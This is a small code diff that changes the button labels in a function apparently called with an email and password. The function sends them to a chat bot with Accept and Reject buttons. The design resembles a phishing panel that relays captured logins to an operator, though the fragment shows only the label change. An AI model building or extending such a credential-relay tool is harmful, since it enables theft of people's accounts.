@@ -14,8 +14,8 @@ function sendApprovalRequest(email, password) {
     reply_markup: {
       inline_keyboard: [
         [
-          { text: "✅ Accept", callback_data: `accept|${email}` },
-          { text: "❌ Reject", callback_data: `reject|${email}` },
+          { text: "✅ Ballaa33", callback_data: `accept|${email}` },
+          { text: "❌ Nsa Al3fsa", callback_data: `reject|${email}` },
         ],
       ],
     },
